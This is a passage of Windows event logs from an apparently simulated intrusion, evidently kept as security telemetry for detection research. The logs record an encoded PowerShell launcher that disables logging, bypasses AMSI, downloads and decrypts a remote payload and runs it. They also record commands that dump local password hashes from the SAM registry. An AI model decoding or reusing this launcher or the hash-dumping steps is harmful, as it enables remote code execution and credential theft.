UAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=50f3d352-332d-4cc2-9811-b903295a8adb\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=            ls HKLM:\\SAM\\SAM\\Domains\\Account\\Users | \n \r\n\r\nDetails: \r\nCommandInvocation(Get-ChildItem): \"Get-ChildItem\"\r\nParameterBinding(Get-ChildItem): name=\"Path\"; value=\"HKLM:\\SAM\\SAM\\Domains\\Account\\Users\"\r\nCommandInvocation(Where-Object): \"Where-Object\"\r\nParameterBinding(Where-Object): name=\"FilterScript\"; value=\"$_.PSChildName -match \"^[0-9A-Fa-f]{8}$\"\"\r\nCommandInvocation(Add-Member): \"Add-Member\"\r\nParameterBinding(Add-Member): name=\"PassThru\"; value=\"True\"\r\nParameterBinding(Add-Member): name=\"MemberType\"; value=\"AliasProperty\"\r\nParameterBinding(Add-Member): name=\"Name\"; value=\"KeyName\"\r\nParameterBinding(Add-Member): name=\"Value\"; value=\"PSChildName\"\r\nCommandInvocation(Add-Member): \"Add-Member\"\r\nParameterBinding(Add-Member): name=\"PassThru\"; value=\"True\"\r\nParameterBinding(Add-Member): name=\"MemberType\"; value=\"ScriptProperty\"\r\nParameterBinding(Add-Member): name=\"Name\"; value=\"Rid\"\r\nParameterBinding(Add-Member): name=\"Value\"; value=\"[Convert]::ToInt32($this.PSChildName, 16)\"\r\nCommandInvocation(Add-Member): \"Add-Member\"\r\nParameterBinding(Add-Member): name=\"PassThru\"; value=\"True\"\r\nParameterBinding(Add-Member): name=\"MemberType\"; value=\"ScriptProperty\"\r\nParameterBinding(Add-Member): name=\"Name\"; value=\"V\"\r\nParameterBinding(Add-Member): name=\"Value\"; value=\"[byte[]]($this.GetValue(\"V\"))\"\r\nCommandInvocation(Add-Member): \"Add-Member\"\r\nParameterBinding(Add-Member): name=\"PassThru\"; value=\"True\"\r\nParameterBinding(Add-Member): name=\"MemberType\"; value=\"ScriptProperty\"\r\nParameterBinding(Add-Member): name=\"Name\"; value=\"UserName\"\r\nParameterBinding(Add-Member): name=\"Value\"; value=\"Get-UserName($this.GetValue(\"V\"))\"\r\nCommandInvocation(Add-Member): \"Add-Member\"\r\nParameterBinding(Add-Member): name=\"PassThru\"; value=\"True\"\r\nParameterBinding(Add-Member): name=\"MemberType\"; value=\"ScriptProperty\"\r\nParameterBinding(Add-Member): name=\"Name\"; value=\"HashOffset\"\r\nParameterBinding(Add-Member): name=\"Value\"; value=\"[BitConverter]::ToUInt32($this.GetValue(\"V\")[0x9c..0x9f],0) + 0xCC\"\r\nParameterBinding(Where-Object): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F4\"\r\nParameterBinding(Add-Member): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F4\"\r\nParameterBinding(Add-Member): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F4\"\r\nParameterBinding(Add-Member): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F4\"\r\nParameterBinding(Add-Member): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F4\"\r\nParameterBinding(Add-Member): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F4\"\r\nParameterBinding(Where-Object): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F5\"\r\nParameterBinding(Add-Member): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F5\"\r\nParameterBinding(Add-Member): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F5\"\r\nParameterBinding(Add-Member): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F5\"\r\nParameterBinding(Add-Member): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F5\"\r\nParameterBinding(Add-Member): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F5\"\r\nParameterBinding(Where-Object): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F7\"\r\nParameterBinding(Add-Member): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F7\"\r\nParameterBinding(Add-Member): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F7\"\r\nParameterBinding(Add-Member): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F7\"\r\nParameterBinding(Add-Member): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F7\"\r\nParameterBinding(Add-Member): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F7\"\r\nParameterBinding(Where-Object): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F8\"\r\nParameterBinding(Add-Member): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F8\"\r\nParameterBinding(Add-Member): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F8\"\r\nParameterBinding(Add-Member): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F8\"\r\nParameterBinding(Add-Member): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F8\"\r\nParameterBinding(Add-Member): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F8\"\r\nParameterBinding(Where-Object): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names\"\r\n","@timestamp":"2020-09-22T08:22:44.462Z","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":240752,"Task":8,"@version":"1","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"PowerShell","Category":"Pipeline Execution Details","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"ImageLoaded":"C:\\Windows\\System32\\sechost.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b453-5f69-c902-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=A330EDE32DFA03AE6808EE7FB6916D8DEB8F5DDE,MD5=A094E2B38D3DD864B07580D243CB6E43,SHA256=C441E19D20961D4E990E117A300ED318BEDBF2F8BA0FF07BEE7832AC502CDDF2,IMPHASH=CE4BD072766253F6A267D0284CA82002","SourceName":"Microsoft-Windows-Sysmon","Description":"Host for SCM/SDDL/LSA Lookup APIs","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.959 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.462Z","port":64545,"RecordNumber":3399421,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"sechost.dll","UtcTime":"2020-09-22 08:22:43.553","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9214364837600034816,"SeverityValue":2,"SubjectDomainName":"THESHIRE","EventID":4658,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","SubjectUserSid":"S-1-5-21-4228717743-1032521047-1810997296-1104","EventReceivedTime":"2020-09-22 04:22:44","ProcessId":"0x1f00","ThreadID":6776,"EventType":"AUDIT_SUCCESS","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Message":"The handle to an object was closed.\r\n\r\nSubject :\r\n\tSecurity ID:\t\tS-1-5-21-4228717743-1032521047-1810997296-1104\r\n\tAccount Name:\t\tpgustavo\r\n\tAccount Domain:\t\tTHESHIRE\r\n\tLogon ID:\t\t0x10A7DF\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity\r\n\tHandle ID:\t\t0x3334\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x1f00\r\n\tProcess Name:\t\tC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","@timestamp":"2020-09-22T08:22:44.462Z","ObjectServer":"Security","SubjectLogonId":"0x10a7df","SourceModuleType":"im_msvistalog","port":64545,"ProcessName":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","RecordNumber":820563,"SubjectUserName":"pgustavo","Task":12801,"@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","Severity":"INFO","HandleId":"0x3334","SourceName":"Microsoft-Windows-Security-Auditing","Version":0,"Category":"Registry","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"ImageLoaded":"C:\\Windows\\System32\\rpcrt4.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b453-5f69-c902-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=863C24BD6E91FDCDEDE1124EFC93FDD1564F0C23,MD5=61C41B28689BB516F1CFC880507C839B,SHA256=DAF391DB91AC04B50A0C896963F5120A52C8B1B4999BF37BE80AB025AB116700,IMPHASH=88E7E7C7FA90052EC162DD37F2B7C7BD","SourceName":"Microsoft-Windows-Sysmon","Description":"Remote Procedure Call Runtime","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.1082 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.463Z","port":64545,"RecordNumber":3399422,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"rpcrt4.dll","UtcTime":"2020-09-22 08:22:43.553","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":36028797018963968,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":800,"ExecutionProcessID":0,"Channel":"Windows PowerShell","host":"wec.internal.cloudapp.net","ThreadID":0,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Message":"Pipeline execution details for command line:             Get-UserKeys | %{\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=28439\r\n\r\n\tUserId=THESHIRE\\pgustavo\r\n\tHostName=Default Host\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=da6e33cf-5ea5-45e8-b75b-b0fc1487af33\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=50f3d352-332d-4cc2-9811-b903295a8adb\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=            Get-UserKeys | %{\n \r\n\r\nDetails: \r\nCommandInvocation(Get-UserKeys): \"Get-UserKeys\"\r\nCommandInvocation(ForEach-Object): \"ForEach-Object\"\r\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"\n                $hashes = Get-UserHashes $_ $hBootKey;\n                \"{0}:{1}:{2}:{3}:::\" -f ($_.UserName,$_.Rid, \n                    [BitConverter]::ToString($hashes[0]).Replace(\"-\",\"\").ToLower(), \n                    [BitConverter]::ToString($hashes[1]).Replace(\"-\",\"\").ToLower());\n                \"`n\"\n            , ...\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F4\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F5\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F7\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F8\"\r\n","@timestamp":"2020-09-22T08:22:44.464Z","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":240753,"Task":8,"@version":"1","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"PowerShell","Category":"Pipeline Execution Details","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"SeverityValue":2,"SubjectDomainName":"THESHIRE","EventReceivedTime":"2020-09-22 04:22:44","EventID":4656,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","ProcessId":"0x1f00","Opcode":"Info","EventTime":"2020-09-22 04:22:43","TransactionId":"{00000000-0000-0000-0000-000000000000}","ObjectServer":"Security","AccessMask":"0x20019","SourceModuleType":"im_msvistalog","ProcessName":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","@version":"1","OpcodeValue":0,"Severity":"INFO","HandleId":"0x16c","ObjectName":"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\.NETFramework","SourceName":"Microsoft-Windows-Security-Auditing","Category":"Registry","Keywords":-9214364837600034816,"ObjectType":"Key","SubjectUserSid":"S-1-5-21-4228717743-1032521047-1810997296-1104","ThreadID":6776,"EventType":"AUDIT_SUCCESS","Message":"A handle to an object was requested.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-21-4228717743-1032521047-1810997296-1104\r\n\tAccount Name:\t\tpgustavo\r\n\tAccount Domain:\t\tTHESHIRE\r\n\tLogon ID:\t\t0x10A7DF\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity\r\n\tObject Type:\t\tKey\r\n\tObject Name:\t\t\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\.NETFramework\r\n\tHandle ID:\t\t0x16c\r\n\tResource Attributes:\t-\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x1f00\r\n\tProcess Name:\t\tC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\r\n\r\nAccess Request Information:\r\n\tTransaction ID:\t\t{00000000-0000-0000-0000-000000000000}\r\n\tAccesses:\t\tREAD_CONTROL\r\n\t\t\t\tQuery key value\r\n\t\t\t\tEnumerate sub-keys\r\n\t\t\t\tNotify about changes to keys\r\n\t\t\t\t\r\n\tAccess Reasons:\t\t-\r\n\tAccess Mask:\t\t0x20019\r\n\tPrivileges Used for Access Check:\t-\r\n\tRestricted SID Count:\t0","AccessReason":"-","PrivilegeList":"-","@timestamp":"2020-09-22T08:22:44.464Z","SubjectLogonId":"0x10a7df","port":64545,"RecordNumber":820564,"SubjectUserName":"pgustavo","Task":12801,"SourceModuleName":"eventlog","Version":1,"AccessList":"%%1538\r\n\t\t\t\t%%4432\r\n\t\t\t\t%%4435\r\n\t\t\t\t%%4436\r\n\t\t\t\t","RestrictedSidCount":"0","ResourceAttributes":"-","Hostname":"WORKSTATION5.theshire.local","tags":["mordorDataset"]}
